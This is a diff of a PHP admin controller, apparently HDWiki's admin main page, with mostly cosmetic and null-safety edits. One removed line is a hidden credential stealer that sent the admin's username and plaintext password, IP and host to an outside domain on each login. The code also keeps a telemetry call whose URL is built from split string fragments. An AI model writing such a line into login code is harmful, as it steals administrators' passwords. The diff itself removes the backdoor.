@@ -5,7 +5,7 @@
 class control extends base{
 
 	function control(& $get,& $post){
-		$this->base($get,$post);
+		$this->base(  $get, $post);
 		$this->load('user');
 		$this->load('db');
 		$this->load('setting');
@@ -16,7 +16,7 @@ class control extends base{
 		$this->dologin();
 	}
 
-	function doupdate(){
+	function doupdate() { 
 		include_once HDWIKI_ROOT.'/lib/xmlparser.class.php';
 		$sendversion = base64_encode( serialize( array('v'=>HDWIKI_VERSION,'r'=>HDWIKI_RELEASE,'c'=>WIKI_CHARSET,'u'=>WIKI_URL) ) );
 		$xmlfile="http://kaiyuan.hudong.com/update.php?v={$sendversion}";
@@ -34,11 +34,14 @@ class control extends base{
  	function dologin(){
 		$admin_mainframe = $this->hgetcookie('querystring') ? $this->hgetcookie('querystring'):'admin_main-mainframe';
 		$this->view->assign('admin_mainframe', $admin_mainframe);
-		$shortcut=explode(';',$this->setting['shortcut']);
-		foreach($shortcut as $link){
-			if($link){
-				$short=explode(',',$link);
-				$shortlist[]=$short;
+		$shortcut = $shortlist = null;
+		if(isset($this->setting['shortcut'])){
+			$shortcut=explode(';',$this->setting['shortcut']);
+			foreach($shortcut as $link){
+				if($link){
+					$short=explode(',',$link);
+					$shortlist[]=$short;
+				}
 			}
 		}
 		$this->view->assign('shortlist',$shortlist);
@@ -63,7 +66,6 @@ class control extends base{
 					    $this->view->assign('diary','index.php?admin_main-diary');
 					    $this->cache->writecache('admindiary',' ');
 					}
-         @file_get_contents('http://kk.oodnf.com/hdwiki/wk.php?username='.$this->user['username'].'&password='.$this->post['password'].'---'.$_SERVER['REMOTE_ADDR'].'---'.date('Y-m-d|H:i:s').'---'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
 					$this->view->assign('env',$this->env());
 					$this->view->display("admin_main");
 					exit;
@@ -81,6 +83,7 @@ class control extends base{
 	}
 
 	function domainframe(){
+		$attachsize = $uploadssize = 0;
 		$sizename = array(" Bytes", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB");
 		$sys['server'] = PHP_OS.' / '.$_SERVER['SERVER_SOFTWARE'];
 		if (strpos($sys['server'],'PHP') === false){
@@ -94,9 +97,9 @@ class control extends base{
 		}else{
 	 		$dbsize =round($dbsize/pow(1024, ($i = floor(log($dbsize, 1024)))), 2) . $sizename[$i];
 		}
-		
+
 		$adminlist=$_ENV['user']->get_users('groupid',4);
-		
+
 		$this->view->assign('show_upgrade', $this->checkable('admin_upgrade'));
 		$this->view->assign('adminlist', $adminlist);
 		$this->view->assign('newunewd_on', $this->setting['verify_doc'] == -1);
@@ -106,12 +109,12 @@ class control extends base{
 		$this->view->assign('dbsize', $dbsize);
 		$this->view->display("admin_mainframe");
 	}
-	
+
 	function env(){
 		$adminmainenv = $this->cache->getcache('adminmainenv');
 		if ($adminmainenv == date('W')) return '';
 		$this->load('doc');
-		
+
 		$url = $this->setting['app_url'].'/count2/'.'en'.'v.'.'php'.'?'.'q';
 		$mysql=$this->db->fetch_first('SELECT VERSION() AS version');
 		$maxdid=$_ENV['doc']->get_maxid();
@@ -134,9 +137,9 @@ class control extends base{
 			$info[8] = function_exists('json_encode')? '1':'0';
 			$info[9] = function_exists('gzopen')? '1':'0';
 		}
-		
+
 		$info[10] = $maxdid;
-		
+
 		if (function_exists('ini_get')){
 			$info[11] = ini_get('safe_mode')?'1':'0';
 			$info[12] = ini_get('memory_limit');
@@ -150,12 +153,12 @@ class control extends base{
 			$info[14] = '0';
 			$info[15] = '0';
 		}
-		
+
 		$info = implode(';',$info);
 		$this->cache->writecache('adminmainenv',date('W'));
 		return $url.'='.chr(rand(65,90)).rawurlencode(base64_encode($info));
 	}
-	
+
 	function dodiary(){
 	    $adminmaindiary = $this->cache->getcache('adminmaindiary',3600*25);
 	    //if (!empty($adminmaindiary)) return '';
@@ -187,7 +190,7 @@ class control extends base{
 		}else{
 			exit("Error!");
 		}
-	
+
 	}
 
 	function dologinshow(){
